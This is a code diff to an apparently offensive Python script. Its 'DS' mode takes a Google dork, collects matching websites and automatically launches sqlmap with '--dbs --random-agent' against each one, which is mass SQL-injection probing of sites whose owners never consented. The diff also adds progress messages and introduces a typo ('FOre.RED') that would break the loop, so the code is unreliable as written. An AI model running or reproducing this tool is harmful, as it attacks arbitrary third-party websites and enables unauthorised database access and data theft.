@@ -115,20 +115,22 @@ if at == "D" :
     print(Fore.RED + '[!]', Fore.LIGHTBLUE_EX + i)
 
 if at == "DS" :
-   searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
-   searchnumber = 1
+   dork = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
 
    for i in search(
-    searchterm, 
+    dork,
     tld="com", 
-    num=searchnumber, 
-    stop=searchnumber, 
-    pause=2,
+    num=1, 
+    pause=1,
     tbs=get_tbs(
         datetime.date(2021, 1, 1),
         datetime.date(2022, 4, 1))
    ):
-    print(Fore.RED +"[!] scanning: " + i)
+    time.sleep(4.0)
+    print(Fore.GREEN+"HUNTING... PLEASE WAIT!")
+    print(Fore.RED +"[:] DORK INSERTED: " + dork, '\n' + "[!] WEBSITE FOUND: " + i)
+    print(FOre.RED + "========================================")
+    time.sleep(10.0)
     call(["sqlmap", i ,"--dbs", "--random-agent"])
 
 if at == "WS" :
